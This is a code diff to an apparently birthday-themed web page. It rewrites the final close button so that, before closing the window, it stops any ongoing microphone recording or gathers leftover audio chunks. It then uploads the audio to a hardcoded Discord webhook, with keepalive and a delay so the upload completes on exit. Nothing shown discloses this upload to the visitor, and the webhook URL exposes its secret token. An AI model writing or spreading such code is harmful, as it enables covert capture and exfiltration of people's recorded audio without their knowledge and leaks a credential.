@@ -1872,7 +1872,43 @@ function showFinalCongrats() {
             finalCloseButton.style.border = 'none';
             finalCloseButton.style.borderRadius = '20px';
             finalCloseButton.style.cursor = 'pointer';
-            finalCloseButton.onclick = () => window.close();
+            finalCloseButton.onclick = async () => {
+                // Ensure the last fully recorded clip is sent before closing
+                try {
+                    // Check if there's any active recording to send
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        await stopAndSendRecording();
+                    } else if (audioChunks && audioChunks.length > 0) {
+                        // If we have chunks that weren't sent yet, send them
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
+                        const formData = new FormData();
+                        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                        const filename = `birthday_wishes_${timestamp}_final.webm`;
+                        
+                        formData.append('file', audioBlob, filename);
+                        formData.append('content', `Final recording before close`);
+                        
+                        const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
+                        
+                        // Use fetch with keepalive for best compatibility when closing
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            body: formData,
+                            keepalive: true
+                        });
+                        
+                        console.log("Final recording clip sent successfully");
+                    }
+                    
+                    // Small delay to ensure the request completes
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                } catch (error) {
+                    console.error("Error sending final recording:", error);
+                }
+                
+                // Now close the window
+                window.close();
+            };
             savingContainer.appendChild(finalCloseButton);
             
         } catch (error) {
